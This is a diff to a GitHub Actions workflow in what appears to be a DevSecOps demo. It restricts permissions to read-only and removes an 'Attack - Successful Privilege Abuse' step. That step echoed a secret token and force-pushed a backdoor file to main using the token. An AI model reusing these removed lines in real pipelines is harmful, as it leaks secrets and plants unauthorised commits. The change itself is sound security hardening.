@@ -5,6 +5,9 @@ on:
     branches:
       - main
 
+permissions:
+  contents: read
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -32,21 +35,4 @@ jobs:
         run: |
           docker build -t devsecops-demo:v1 .
       
-      - name: Attack - Successful Privilege Abuse
-        env:
-          MY_SECRET_TOKEN: ${{ secrets.HACKER_TOKEN }}
-        run: |
-          echo "Memulai serangan..."
-          git config --global user.email "hacker@evil.com"
-          git config --global user.name "Hacker_Inside"
-          
-          echo "BERHASIL TEMBUS" > backdoor_final.txt
-          
-          # Kita pastikan token terdeteksi (GitHub akan menyensornya dengan *)
-          echo "Token check: $MY_SECRET_TOKEN"
-          
-          git add backdoor_final.txt
-          git commit -m "EVIL: Exploit"
-          
-          # Gunakan variabel env dengan tanda kutip agar aman
-          git push --force "https://x-access-token:${MY_SECRET_TOKEN}@github.com/${{ github.repository }}.git" main
+      
